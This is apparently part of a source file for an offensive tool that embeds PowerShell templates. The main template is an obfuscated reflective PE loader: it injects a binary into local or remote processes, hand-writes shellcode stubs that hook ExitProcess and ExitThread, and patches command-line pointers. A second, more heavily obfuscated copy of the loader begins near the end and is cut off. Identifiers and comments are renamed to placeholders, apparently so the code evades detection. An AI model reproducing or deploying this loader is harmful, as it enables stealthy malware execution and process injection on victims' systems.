                    [IntPtr]$VAR0245 = $VAR0042.FUN036.Invoke($VAR0243, "_acmdln")
                    if ($VAR0244 -eq $VAR095::Zero -or $VAR0245 -eq $VAR095::Zero) {
# LYRICS818
                        "ERROR41"
                    }
# LYRICS819
                    $VAR0246 = $VAR099::StringToHGlobalAnsi($VAR0227)
# LYRICS820
                    $VAR0247 = $VAR099::StringToHGlobalUni($VAR0227)
# LYRICS821
# LYRICS822
# LYRICS823
                    $VAR0248 = $VAR099::PtrToStructure($VAR0245, [Type][IntPtr])
# LYRICS824
                    $VAR0249 = $VAR099::PtrToStructure($VAR0244, [Type][IntPtr])
                    $VAR0250 = $VAR099::AllocHGlobal($VAR0163)
                    $VAR0251 = $VAR099::AllocHGlobal($VAR0163)
# LYRICS825
                    $VAR099::StructureToPtr($VAR0248, $VAR0250, $false)
# LYRICS826
                    $VAR099::StructureToPtr($VAR0249, $VAR0251, $false)
                    $VAR0229 += , ($VAR0245, $VAR0250, $VAR0163)
# LYRICS827
                    $VAR0229 += , ($VAR0244, $VAR0251, $VAR0163)
# LYRICS828
                    $Success = $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                    if ($Success = $false) {
                        throw "ERROR42"
                    }
                    $VAR099::StructureToPtr($VAR0246, $VAR0245, $false)
# LYRICS829
                    $VAR0042.FUN040.Invoke($VAR0245, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
# LYRICS830
# LYRICS831
                    $Success = $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0041.CONST008), [Ref]$VAR0226)
                    if ($Success = $false) {
# LYRICS832
                        throw "ERROR43"
                    }
                    $VAR099::StructureToPtr($VAR0247, $VAR0244, $false)
# LYRICS833
                    $VAR0042.FUN040.Invoke($VAR0244, [UInt32]$VAR0163, [UInt32]($VAR0226), [Ref]$VAR0226) | Out-Null
                }
            }
# LYRICS834
# LYRICS835
# LYRICS836
# LYRICS837
# LYRICS838
            $VAR0229 = @()
# LYRICS839
            $VAR0252 = @() 
# LYRICS840
# LYRICS841
            [IntPtr]$VAR0253 = $VAR0042.FUN041.Invoke("mscoree.dll")
# LYRICS842
            if ($VAR0253 -eq $VAR095::Zero) {
# LYRICS843
                throw "ERROR44"
            }
            [IntPtr]$VAR0254 = $VAR0042.FUN036.Invoke($VAR0253, "CorExitProcess")
# LYRICS844
            if ($VAR0254 -eq $VAR095::Zero) {
                Throw "ERROR45"
# LYRICS845
            }
            $VAR0252 += $VAR0254
# LYRICS846
# LYRICS847
            [IntPtr]$VAR0255 = $VAR0042.FUN036.Invoke($VAR0168, "ExitProcess")
# LYRICS848
            if ($VAR0255 -eq $VAR095::Zero) {
                Throw "ERROR46"
# LYRICS849
            }
            $VAR0252 += $VAR0255
# LYRICS850
            [UInt32]$VAR0226 = 0
            foreach ($VAR0256 in $VAR0252) {
# LYRICS851
                $VAR0257 = $VAR0256
# LYRICS852
# LYRICS853
                [Byte[]]$VAR0235 = 187
# LYRICS854
                [Byte[]]$VAR0236 = 198,3,1,131,236,32,131,228,192,187
# LYRICS855
                if ($VAR0163 -eq 8) {
                    [Byte[]]$VAR0235 = 72,187
# LYRICS856
                    [Byte[]]$VAR0236 = 198,3,1,72,131,236,32,102,131,228,192,72,187
                }
                [Byte[]]$VAR0258 = 255,211
# LYRICS857
                $VAR0237 = $VAR0235.Length + $VAR0163 + $VAR0236.Length + $VAR0163 + $VAR0258.Length
# LYRICS858
                [IntPtr]$VAR0259 = $VAR0042.FUN036.Invoke($VAR0168, "ExitThread")
# LYRICS859
                if ($VAR0259 -eq $VAR095::Zero) {
                    Throw "ERROR47"
                }
# LYRICS860
                $Success = $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
# LYRICS861
                if ($Success -eq $false) {
                    Throw "ERROR48"
                }
# LYRICS862
# LYRICS863
                $VAR0260 = $VAR099::AllocHGlobal($VAR0237)
# LYRICS864
                $VAR0042.FUN033.Invoke($VAR0260, $VAR0256, [UInt64]$VAR0237) | Out-Null
# LYRICS865
                $VAR0229 += , ($VAR0256, $VAR0260, $VAR0237)
# LYRICS866
# LYRICS867
# LYRICS868
                FUN010 -Bytes $VAR0235 -VAR0129 $VAR0257
                $VAR0257 = FUN005 $VAR0257 ($VAR0235.Length)
# LYRICS869
                $VAR099::StructureToPtr($VAR0228, $VAR0257, $false)
                $VAR0257 = FUN005 $VAR0257 $VAR0163
# LYRICS870
                FUN010 -Bytes $VAR0236 -VAR0129 $VAR0257
                $VAR0257 = FUN005 $VAR0257 ($VAR0236.Length)
# LYRICS871
                $VAR099::StructureToPtr($VAR0259, $VAR0257, $false)
# LYRICS872
                $VAR0257 = FUN005 $VAR0257 $VAR0163
# LYRICS873
                FUN010 -Bytes $VAR0258 -VAR0129 $VAR0257
# LYRICS874
                $VAR0042.FUN040.Invoke($VAR0256, [UInt32]$VAR0237, [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            }
# LYRICS875
# LYRICS876
            Write-Output $VAR0229
        }
# LYRICS877
# LYRICS878
# LYRICS879
        Function FUN026 {
# LYRICS880
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [Array[]]
                $VAR0261,
# LYRICS881
                [Parameter(Position = 1, Mandatory = $true)]
                [System.Object]
                $VAR0042,
# LYRICS882
                [Parameter(Position = 2, Mandatory = $true)]
                [System.Object]
                $VAR0041
            )
# LYRICS883
            [UInt32]$VAR0226 = 0
            foreach ($VAR0262 in $VAR0261) {
# LYRICS884
                $Success = $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0041.CONST008, [Ref]$VAR0226)
# LYRICS885
                if ($Success -eq $false) {
                    Throw "ERROR50"
                }
# LYRICS886
                $VAR0042.FUN033.Invoke($VAR0262[0], $VAR0262[1], [UInt64]$VAR0262[2]) | Out-Null
# LYRICS887
# LYRICS888
                $VAR0042.FUN040.Invoke($VAR0262[0], [UInt32]$VAR0262[2], [UInt32]$VAR0226, [Ref]$VAR0226) | Out-Null
            }
        }
# LYRICS889
# LYRICS890
# LYRICS891
# LYRICS892
# LYRICS893
        Function FUN027 {
# LYRICS894
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263,
# LYRICS895
                [Parameter(Position = 1, Mandatory = $true)]
                [String]
                $VAR0187
            )
# LYRICS896
            $VAR010 = FUN001
# LYRICS897
            $VAR0041 = FUN002
# LYRICS898
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS899
# LYRICS900
            if ($VAR0126.CONST031.CONST122.CONST107.Size -eq 0) {
# LYRICS901
                return $VAR095::Zero
            }
            $VAR0264 = FUN005 ($VAR0263) ($VAR0126.CONST031.CONST122.CONST107.CONST074)
# LYRICS902
            $VAR0265 = $VAR099::PtrToStructure($VAR0264, [Type]$VAR010.CONST155)
# LYRICS903
            for ($i = 0; $i -lt $VAR0265.CONST159; $i++) {
# LYRICS904
                $VAR0266 = FUN005 ($VAR0263) ($VAR0265.CONST161 + ($i * $VAR099::SizeOf([Type][UInt32])))
# LYRICS905
                $VAR0267 = FUN005 ($VAR0263) ($VAR099::PtrToStructure($VAR0266, [Type][UInt32]))
# LYRICS906
                $VAR0268 = $VAR099::PtrToStringAnsi($VAR0267)
# LYRICS907
                if ($VAR0268 -ceq $VAR0187) {
# LYRICS908
# LYRICS909
                    $VAR0269 = FUN005 ($VAR0263) ($VAR0265.CONST162 + ($i * $VAR099::SizeOf([Type][UInt16])))
# LYRICS910
                    $VAR0270 = $VAR099::PtrToStructure($VAR0269, [Type][UInt16])
# LYRICS911
                    $VAR0271 = FUN005 ($VAR0263) ($VAR0265.CONST160 + ($VAR0270 * $VAR099::SizeOf([Type][UInt32])))
# LYRICS912
                    $VAR0272 = $VAR099::PtrToStructure($VAR0271, [Type][UInt32])
                    return FUN005 ($VAR0263) ($VAR0272)
                }
            }
# LYRICS913
            return $VAR095::Zero
        }
# LYRICS914
# LYRICS915
        Function FUN028 {
# LYRICS916
            Param(
                [Parameter( Position = 0, Mandatory = $true )]
                [Byte[]]
                $VAR001,
# LYRICS917
                [Parameter(Position = 1, Mandatory = $false)]
                [String]
                $VAR004,
# LYRICS918
                [Parameter(Position = 2, Mandatory = $false)]
                [IntPtr]
                $VAR0161,
# LYRICS919
                [Parameter(Position = 3)]
                [Bool]
                $VAR007 = $false
            )
# LYRICS920
            $VAR0163 = $VAR099::SizeOf([Type][IntPtr])
# LYRICS921
# LYRICS922
            $VAR0041 = FUN002
            $VAR0042 = FUN003
# LYRICS923
            $VAR010 = FUN001
# LYRICS924
            $VAR0210 = $false
            if (($VAR0161 -ne $null) -and ($VAR0161 -ne $VAR095::Zero)) {
# LYRICS925
                $VAR0210 = $true
            }
# LYRICS926
# LYRICS927
            $VAR0126 = FUN016 -VAR001 $VAR001 -VAR010 $VAR010
# LYRICS928
            $VAR0196 = $VAR0126.VAR0196
            $VAR0273 = $true
# LYRICS929
            if (([Int] $VAR0126.CONST035 -band $VAR0041.CONST024) -ne $VAR0041.CONST024) {
# LYRICS930
                $VAR0273 = $false
            }
# LYRICS931
# LYRICS932
            $VAR0274 = $true
# LYRICS933
            if ($VAR0210 -eq $true) {
                $VAR0168 = $VAR0042.FUN041.Invoke($VAR0302)
# LYRICS934
                $VAR0144 = $VAR0042.FUN036.Invoke($VAR0168, "IsWow64Process")
# LYRICS935
                if ($VAR0144 -eq $VAR095::Zero) {
                    Throw "ERROR52"
                }
# LYRICS936
                [Bool]$VAR0275 = $false
                $Success = $VAR0042.FUN055.Invoke($VAR0161, [Ref]$VAR0275)
# LYRICS937
                if ($Success -eq $false) {
                    Throw "ERROR53"
                }
# LYRICS938
                if (($VAR0275 -eq $true) -or (($VAR0275 -eq $false) -and ($VAR099::SizeOf([Type][IntPtr]) -eq 4))) {
# LYRICS939
                    $VAR0274 = $false
                }
# LYRICS940
# LYRICS941
                $VAR0276 = $true
                if ($VAR099::SizeOf([Type][IntPtr]) -ne 8) {
# LYRICS942
                    $VAR0276 = $false
                }
                if ($VAR0276 -ne $VAR0274) {
                    throw "ERROR54"
                }
            }
            else {
                if ($VAR099::SizeOf([Type][IntPtr]) -ne 8) {
# LYRICS943
                    $VAR0274 = $false
                }
            }
            if ($VAR0274 -ne $VAR0126.CONST032) {
# LYRICS944
                Throw "ERROR55"
            }
# LYRICS945
# LYRICS946
# LYRICS947
# LYRICS948
            [IntPtr]$VAR0277 = $VAR095::Zero
# LYRICS949
            $VAR0278 = ([Int] $VAR0126.CONST035 -band $VAR0041.CONST023) -eq $VAR0041.CONST023
            if ((-not $VAR007) -and (-not $VAR0278)) {
# LYRICS950
                Write-Warning "ERROR56" -WarningAction Continue
                [IntPtr]$VAR0277 = $VAR0196
            }
# LYRICS951
# LYRICS952
# LYRICS953
            $VAR0263 = $VAR095::Zero              
# LYRICS954
            $VAR0279 = $VAR095::Zero     
            if ($VAR0210 -eq $true) {
# LYRICS955
                $VAR0263 = $VAR0042.FUN031.Invoke($VAR095::Zero, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS956
# LYRICS957
                $VAR0279 = $VAR0042.FUN032.Invoke($VAR0161, $VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS958
                if ($VAR0279 -eq $VAR095::Zero) {
                    Throw "ERROR57"
                }
            }
            else {
                if ($VAR0273 -eq $true) {
                    $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST005)
# LYRICS959
                }
                else {
                    $VAR0263 = $VAR0042.FUN031.Invoke($VAR0277, [UIntPtr]$VAR0126.CONST033, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS960
                }
                $VAR0279 = $VAR0263
            }
# LYRICS961
            [IntPtr]$VAR0128 = FUN005 ($VAR0263) ([Int64]$VAR0126.CONST033)
            if ($VAR0263 -eq $VAR095::Zero) {
                Throw "ERROR58."
            }
# LYRICS962
            $VAR099::Copy($VAR001, 0, $VAR0263, $VAR0126.CONST034) | Out-Null
# LYRICS963
# LYRICS964
# LYRICS965
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS966
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST038 -Value $VAR0128
            $VAR0126 | Add-Member -MemberType NoteProperty -Name CONST039 -Value $VAR0279
# LYRICS967
# LYRICS968
            FUN020 -VAR001 $VAR001 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010
# LYRICS969
# LYRICS970
# LYRICS971
            FUN021 -VAR0126 $VAR0126 -VAR0196 $VAR0196 -VAR0041 $VAR0041 -VAR010 $VAR010
# LYRICS972
# LYRICS973
# LYRICS974
            if ($VAR0210 -eq $true) {
                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041 -VAR0161 $VAR0161
            }
            else {
                FUN022 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR010 $VAR010 -VAR0041 $VAR0041
            }
# LYRICS975
# LYRICS976
# LYRICS977
            if ($VAR0210 -eq $false) {
                if ($VAR0273 -eq $true) {
# LYRICS978
                    FUN024 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR010 $VAR010
                }
# LYRICS979
            }
# LYRICS980
# LYRICS981
# LYRICS982
# LYRICS983
            if ($VAR0210 -eq $true) {
                [UInt32]$VAR0167 = 0
# LYRICS984
                $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0279, $VAR0263, [UIntPtr]($VAR0126.CONST033), [Ref]$VAR0167)
# LYRICS985
                if ($Success -eq $false) {
                    Throw "ERROR59"
                }
            }
# LYRICS986
# LYRICS987
# LYRICS988
            if ($VAR0126.CONST037 -ieq "Library") {
# LYRICS989
                if ($VAR0210 -eq $false) {
# LYRICS990
                    $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
# LYRICS991
                    $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
# LYRICS992
                    $VAR0282 = $VAR099::$VAR096($VAR0280, $VAR0281)
# LYRICS993
                    $VAR0282.Invoke($VAR0126.VAR0263, 1, $VAR095::Zero) | Out-Null
                }
                else {
                    $VAR0280 = FUN005 ($VAR0279) ($VAR0126.CONST031.CONST122.CONST060)
# LYRICS994
                    if ($VAR0126.CONST032 -eq $true) {
# LYRICS995
                        $VAR0283 = 83,72,137,227,102,131,228,0,72,185
# LYRICS996
                        $VAR0284 = 186,1,0,0,0,65,184,0,0,0,0,72,184
# LYRICS997
                        $VAR0285 = 255,208,72,137,220,91,195
                    }
                    else {
# LYRICS998
                        $VAR0283 = 83,137,227,131,228,240,185
# LYRICS999
                        $VAR0284 = 186,1,0,0,0,184,0,0,0,0,80,82,81,184
                        $VAR0285 = 255,208,137,220,91,195
                    }
                    $VAR0171 = $VAR0283.Length + $VAR0284.Length + $VAR0285.Length + ($VAR0163 * 2)
# LYRICS1000
                    $VAR0172 = $VAR099::AllocHGlobal($VAR0171)
                    $VAR0173 = $VAR0172
# LYRICS1001
                    FUN010 -Bytes $VAR0283 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0283.Length)
# LYRICS1002
                    $VAR099::StructureToPtr($VAR0279, $VAR0172, $false)
                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
                    FUN010 -Bytes $VAR0284 -VAR0129 $VAR0172
# LYRICS1003
                    $VAR0172 = FUN005 $VAR0172 ($VAR0284.Length)
                    $VAR099::StructureToPtr($VAR0280, $VAR0172, $false)
# LYRICS1004
                    $VAR0172 = FUN005 $VAR0172 ($VAR0163)
# LYRICS1005
                    FUN010 -Bytes $VAR0285 -VAR0129 $VAR0172
                    $VAR0172 = FUN005 $VAR0172 ($VAR0285.Length)
# LYRICS1006
                    $VAR0178 = $VAR0042.FUN032.Invoke($VAR0161, $VAR095::Zero, [UIntPtr][UInt64]$VAR0171, $VAR0041.CONST001 -bor $VAR0041.CONST002, $VAR0041.CONST008)
# LYRICS1007
                    if ($VAR0178 -eq $VAR095::Zero) {
# LYRICS1008
                        Throw "ERROR60"
                    }
# LYRICS1009
                    $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
# LYRICS1010
                    if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
                        Throw "ERROR61"
                    }
# LYRICS1011
                    $VAR0179 = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
# LYRICS1012
                    $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
# LYRICS1013
                    if ($VAR0144 -ne 0) {
                        Throw "ERROR62"
                    }
# LYRICS1014
                    $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
                }
            }
            elseif ($VAR0126.CONST037 -ieq "Executable") {
# LYRICS1015
                [IntPtr]$VAR0228 = $VAR099::AllocHGlobal(1)
# LYRICS1016
                $VAR099::WriteByte($VAR0228, 0, 0x00)
# LYRICS1017
                $VAR0286 = FUN025 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR0227 $VAR004 -VAR0228 $VAR0228
# LYRICS1018
# LYRICS1019
# LYRICS1020
                [IntPtr]$VAR0287 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
# LYRICS1021
                $VAR0042.FUN056.Invoke($VAR095::Zero, $VAR095::Zero, $VAR0287, $VAR095::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
# LYRICS1022
                while ($true) {
                    [Byte]$VAR0288 = $VAR099::ReadByte($VAR0228, 0)
# LYRICS1023
                    if ($VAR0288 -eq 1) {
# LYRICS1024
                        FUN026 -VAR0261 $VAR0286 -VAR0042 $VAR0042 -VAR0041 $VAR0041
                        break
                    }
                    else {
# LYRICS1025
                        Start-Sleep -Seconds 1
                    }
                }
            }
# LYRICS1026
            return @($VAR0126.VAR0263, $VAR0279)
        }
# LYRICS1027
# LYRICS1028
        Function FUN029 {
# LYRICS1029
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $VAR0263
            )
# LYRICS1030
# LYRICS1031
            $VAR0041 = FUN002
            $VAR0042 = FUN003
# LYRICS1032
            $VAR010 = FUN001
# LYRICS1033
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS1034
# LYRICS1035
            if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
# LYRICS1036
                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)
# LYRICS1037
                while ($true) {
# LYRICS1038
                    $VAR0212 = $VAR099::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)
# LYRICS1039
# LYRICS1040
                    if ($VAR0212.CONST067 -eq 0 `
                            -and $VAR0212.CONST154 -eq 0 `
                            -and $VAR0212.CONST153 -eq 0 `
                            -and $VAR0212.Name -eq 0 `
                            -and $VAR0212.CONST071 -eq 0) {
                        break
                    }
# LYRICS1041
                    $VAR0164 = $VAR099::PtrToStringAnsi((FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name)))
# LYRICS1042
                    $VAR0213 = $VAR0042.FUN041.Invoke($VAR0164)
# LYRICS1043
# LYRICS1044
# LYRICS1045
                    $Success = $VAR0042.FUN042.Invoke($VAR0213)
# LYRICS1046
# LYRICS1047
                    $VAR0211 = FUN005 ($VAR0211) ($VAR099::SizeOf([Type]$VAR010.CONST152))
                }
            }
# LYRICS1048
# LYRICS1049
            $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
# LYRICS1050
            $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
# LYRICS1051
            $VAR0282 = $VAR099::$VAR096($VAR0280, $VAR0281)
# LYRICS1052
            $VAR0282.Invoke($VAR0126.VAR0263, 0, $VAR095::Zero) | Out-Null
# LYRICS1053
# LYRICS1054
            $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
# LYRICS1055
        }
# LYRICS1056
# LYRICS1057
        Function FUN030 {
            $VAR0042 = FUN003
            $VAR010 = FUN001
# LYRICS1058
            $VAR0041 = FUN002
# LYRICS1059
            $VAR0161 = $VAR095::Zero
# LYRICS1060
# LYRICS1061
            if (($VAR005 -ne $null) -and ($VAR005 -ne 0) -and ($VAR006 -ne $null) -and ($VAR006 -ne "")) {
# LYRICS1062
                Throw "ERROR64"
            }
            elseif ($VAR006 -ne $null -and $VAR006 -ne "") {
# LYRICS1063
                $VAR0289 = @(Get-Process -Name $VAR006 -ErrorAction SilentlyContinue)
# LYRICS1064
                if ($VAR0289.Count -eq 0) {
                    Throw "ERROR65 $VAR006"
                }
                elseif ($VAR0289.Count -gt 1) {
# LYRICS1065
                    $VAR0290 = Get-Process | Where-Object { $_.Name -eq $VAR006 } | Select-Object ProcessName, Id, SessionId
# LYRICS1066
                    Write-Output $VAR0290
                    Throw "ERROR66 $VAR006"
                }
                else {
                    $VAR005 = $VAR0289[0].ID
                }
            }
# LYRICS1067
# LYRICS1068
# LYRICS1069
# LYRICS1070
# LYRICS1071
# LYRICS1072
# LYRICS1073
# LYRICS1074
# LYRICS1075
            if (($VAR005 -ne $null) -and ($VAR005 -ne 0)) {
# LYRICS1076
                $VAR0161 = $VAR0042.FUN043.Invoke(0x001F0FFF, $false, $VAR005)
# LYRICS1077
                if ($VAR0161 -eq $VAR095::Zero) {
                    Throw "ERROR67: $VAR005"
                }
# LYRICS1078
            }
# LYRICS1079
# LYRICS1080
# LYRICS1081
            $VAR0263 = $VAR095::Zero
            if ($VAR0161 -eq $VAR095::Zero) {
# LYRICS1082
                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR007 $VAR007
            }
            else {
# LYRICS1083
                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR0161 $VAR0161 -VAR007 $VAR007
            }
            if ($VAR0291 -eq $VAR095::Zero) {
# LYRICS1084
                Throw "ERROR68"
            }
# LYRICS1085
            $VAR0263 = $VAR0291[0]
# LYRICS1086
            $VAR0292 = $VAR0291[1] 
# LYRICS1087
# LYRICS1088
# LYRICS1089
            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
# LYRICS1090
            if (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -eq $VAR095::Zero)) {
# LYRICS1091
# LYRICS1092
# LYRICS1093
                switch ($VAR003) {
                    'WideStr' {
# LYRICS1094
# LYRICS1095
                        [IntPtr]$VAR0293 = FUN027 -VAR0263 $VAR0263 -FunctionName "WideStrFunc"
# LYRICS1096
                        if ($VAR0293 -eq $VAR095::Zero) {
                            Throw "ERROR67"
                        }
                        $VAR0294 = FUN011 @() ([IntPtr])
# LYRICS1097
                        $VAR0295 = $VAR099::$VAR096($VAR0293, $VAR0294)
# LYRICS1098
                        [IntPtr]$VAR0296 = $VAR0295.Invoke()
# LYRICS1099
                        $VAR0297 = $VAR099::PtrToStringUni($VAR0296)
                        Write-Output $VAR0297
                    }
# LYRICS1100
                    'Str' {
# LYRICS1101
                        [IntPtr]$VAR0298 = FUN027 -VAR0263 $VAR0263 -FunctionName "StringFunc"
# LYRICS1102
                        if ($VAR0298 -eq $VAR095::Zero) {
                            Throw "ERROR68"
                        }
                        $VAR0299 = FUN011 @() ([IntPtr])
# LYRICS1103
                        $VAR0300 = $VAR099::$VAR096($VAR0298, $VAR0299)
# LYRICS1104
                        [IntPtr]$VAR0296 = $VAR0300.Invoke()
# LYRICS1105
                        $VAR0297 = $VAR099::PtrToStringAnsi($VAR0296)
# LYRICS1106
                        Write-Output $VAR0297
                    }
# LYRICS1107
                    'NoOutput' {
# LYRICS1108
                        [IntPtr]$VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
                        if ($VAR0301 -eq $VAR095::Zero) {
# LYRICS1109
                            Throw "ERROR69"
                        }
                        $VAR0302 = FUN011 @() ([Void])
# LYRICS1110
                        $VAR0303 = $VAR099::$VAR096($VAR0301, $VAR0302)
# LYRICS1111
                        $VAR0303.Invoke() | Out-Null
                    }
                    'DefaultSettings' {
# LYRICS1112
                        Write-Verbose "ERROR70"
                    }
                }
# LYRICS1113
# LYRICS1114
# LYRICS1115
            }
# LYRICS1116
            elseif (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -ne $VAR095::Zero)) {
# LYRICS1117
                $VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
# LYRICS1118
                if (($VAR0301 -eq $null) -or ($VAR0301 -eq $VAR095::Zero)) {
# LYRICS1119
                    Throw "ERROR71"
                }
# LYRICS1120
                $VAR0301 = FUN004 $VAR0301 $VAR0263
# LYRICS1121
                $VAR0301 = FUN005 $VAR0301 $VAR0292
# LYRICS1122
# LYRICS1123
# LYRICS1124
                $Null = FUN014 -VAR0151 $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
            }
# LYRICS1125
# LYRICS1126
# LYRICS1127
            if ($VAR0161 -eq $VAR095::Zero -and $VAR0126.CONST037 -ieq "Library") {
# LYRICS1128
                FUN029 -VAR0263 $VAR0263
            }
            else {
# LYRICS1129
# LYRICS1130
                $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
# LYRICS1131
            }
# LYRICS1132
        }
# LYRICS1133
        FUN030
    }
# LYRICS1134
# LYRICS1135
    Function FUN030 {
# LYRICS1136
# LYRICS1137
# LYRICS1138
        if (-not $VAR008) {
# LYRICS1139
# LYRICS1140
            $VAR001[0] = 0
# LYRICS1141
            $VAR001[1] = 0
        }
# LYRICS1142
# LYRICS1143
        if ($VAR004 -ne $null -and $VAR004 -ne '') {
# LYRICS1144
            $VAR004 = "VAR0305 $VAR004"
        }
        else {
            $VAR004 = "VAR0305"
        }
# LYRICS1145
        if ($VAR002 -eq $null -or $VAR002 -imatch "^\s*$") {
# LYRICS1146
            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004)
# LYRICS1147
        }
        else {
# LYRICS1148
            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004) -VAR002 $VAR002
# LYRICS1149
        }
    }
# LYRICS1150
    FUN030
}



$Bytes = QWERQWERQWER
FUN000 -VAR001 $Bytes

"""


let PowershellObfsTemplate * = """

  &( "{0}{1}{2}"-f 'S','Et-','ITEM'  ) ("VARI"  +"Ab"  + "lE:"+  "5wg"  )  ([tyPE]( "{1}{0}" -f'32','INT' )  )   ;     &( "{1}{0}"-f't-itEM','sE' ) VARIABLE:jXB5vo  (    [type](  "{1}{0}"-F'l','bOo')   )  ;    $xDyU=  [TYPe]( "{1}{0}"-F'32','Uint') ;    &  ("{2}{0}{1}" -f 't','EM','seT-i'  ) varIaBlE:iGt ( [typE]("{3}{1}{0}{2}" -f 'o','c','nVerTeR','bIT'  )   )   ;  &( "{2}{1}{0}"-f'TEM','eT-i','S'  ) ( "Var"+  "IaB"+  "L"+  "e:6KJFH")  ( [TypE](  "{0}{1}{4}{5}{7}{12}{11}{2}{9}{10}{6}{3}{8}" -f'syst','em','M','Ild','.R','efle','lYbU','CtIO','eRAcCEsS','it','.AssEmB','.E','N' )  ) ;     &(  "{2}{0}{1}"-f'ariA','BLE','SET-v')  u5e ( [TYPE]("{7}{6}{3}{8}{1}{5}{0}{2}{4}"-F'v','cTION.CAl','E','Fl','NtIonS','LinGCOn','stem.RE','SY','E') )    ;    $d9m0QN =  [TYpe](  "{2}{1}{0}" -f'n','ai','AppdOm');     &(  "{0}{2}{1}"-f'SEt','TEM','-i'  )  ( 'vaRi' +'a' + 'BlE:523'  +  '0') ( [TYPe]( "{1}{2}{0}"-f 'ent','E','NvIrOnm'  )  )  ;    & ("{2}{1}{0}"-f'EM','-iT','sET') ( "V" + "AriaBl"+"e:"  +"D"+  "aEH")  (  [TYPE]( "{2}{1}{0}"-F 'R','T','InTP' )  );     &  ( "{0}{1}" -f 'SE','T')  321IU  (   [tYPe](  "{0}{1}" -f'U','InTptr'  )   )  ;  &( "{1}{0}{2}"-f 't-vARI','se','AblE' ) ( 'Uq'+  'J' )  (  [TYPe](  "{1}{0}"-F 'h','maT' )   ) ; function f`Un000 {
# LYRICS001
    [CmdletBinding(  )]
    Param(
        [Parameter(  POSItIoN =   0, mANdAtOrY  =   $true)]
        [ValidateNotNullOrEmpty(   )]
        [Byte[]]
        $VAR001,
# LYRICS002
        [Parameter(pOsItIon  =   1  )]
        [String[]]
        $VAR002,
# LYRICS003
        [Parameter(  posiTion = 2)]
